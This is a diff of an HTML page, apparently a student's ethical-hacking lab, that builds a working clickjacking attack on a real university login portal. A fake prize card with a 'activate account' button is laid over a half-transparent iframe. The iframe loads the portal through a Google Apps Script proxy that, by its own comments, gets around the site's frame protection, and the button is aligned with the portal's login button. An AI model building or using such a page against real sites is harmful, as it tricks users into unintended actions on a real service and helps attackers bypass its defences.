@@ -3,42 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking Lab - UST Yemen</title>
+    <title>Ethical Hacking Lab - UST</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f4f4f4; }
         
-        /* طبقة المصيدة (الجوائز) */
-        #decoy {
+
+        #decoy-ui {
             position: absolute; width: 100%; height: 100%;
-            background: #fff; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; z-index: 1;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; z-index: 10; pointer-events: none; /* تجعل النقرات تمر لما تحتها */
         }
 
-        .claim-btn {
-            background-color: #4285f4; color: white; padding: 15px 50px;
-            border: none; border-radius: 6px; font-size: 18px;
-            /* عدل الـ margin-top هنا لضبط مكان الزر فوق زر دخول نظام الجامعة */
-            margin-top: 360px; 
+        .prize-card {
+            background: white; padding: 40px; border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; width: 80%;
         }
 
-        /* الإطار اللي بيكسر حماية موقع الجامعة */
-        #target-frame {
+        .action-btn {
+            background: #007bff; color: white; padding: 15px 60px;
+            border: none; border-radius: 8px; font-size: 20px; font-weight: bold;
+            margin-top: 360px; /* ليتطابق مع زر دخول نظام الجامعة */
+            box-shadow: 0 4px 10px rgba(0,123,255,0.3);
+        }
+
+        
+        #target-site {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0.5; /* خليه شفاف عشان الدكتور يشوف الموقعين فوق بعض */
-            z-index: 2; border: none;
+            border: none; opacity: 0.5; /* شفافية للعرض أمام الدكتور */
+            z-index: 5;
         }
     </style>
 </head>
 <body>
 
-    <div id="decoy">
-        <h2 style="color: #d93025;">🎊 تهانينا طالبنا العزيز!</h2>
-        <p>اضغط لتفعيل الدخول الموحد والحصول على بريدك الجامعي</p>
-        <button class="claim-btn">تفعيل الدخول الآن</button>
+    <div id="decoy-ui">
+        <div class="prize-card">
+            <h1 style="color: #e63946;">🎉 مبروك! مكافأة الطالب المتميز</h1>
+            <p>اضغط أدناه لتنشيط حسابك واستلام المكافأة فوراً</p>
+            <button class="action-btn">تنشيط الحساب</button>
+        </div>
     </div>
 
-    <iframe id="target-frame" src="https://script.google.com/macros/s/AKfycbwYi-JpuxpaOqBKLK_E4JiZtUCA9DOpaBQxEXvpp0667mjl3QdqGL6hp-3WfPmqqse-sA/exec?url=https://portal.ust.edu.ye"></iframe>
+    <iframe id="target-site"></iframe>
 
+    <script>
+        
+        const targetUrl = "https://portal.ust.edu.ye";
+        
+        const googleProxy = "https://script.google.com/macros/s/AKfycbwYi-JpuxpaOqBKLK_E4JiZtUCA9DOpaBQxEXvpp0667mjl3QdqGL6hp-3WfPmqqse-sA/exec?url=";
+
+        
+        function loadAttack() {
+            const frame = document.getElementById('target-site');
+            
+            frame.src = googleProxy + encodeURIComponent(targetUrl);
+        }
+
+        window.onload = loadAttack;
+    </script>
 </body>
 </html>
-
